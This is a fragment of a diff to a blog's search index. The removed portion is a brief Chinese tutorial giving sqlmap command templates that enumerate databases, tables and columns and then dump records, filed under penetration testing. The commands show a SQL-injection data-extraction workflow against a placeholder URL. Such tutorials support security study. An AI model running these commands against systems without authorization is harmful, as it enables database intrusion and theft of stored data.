-<p>列出当前所有的库</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> --dbs  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap2.png"></p>
-<p>列出当前选中库的表</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap3.png"></p>
-<p>列出当前选中表和库的字段</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T <span class="token string">'表'</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap4.png"></p>
-<p>列出当前选中表，库，字段的记录</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T ‘表’ -C ‘字段’ --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap5.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>渗透工具</tag>
+        <tag>安全策略</tag>
       </tags>
   </entry>
 </search>
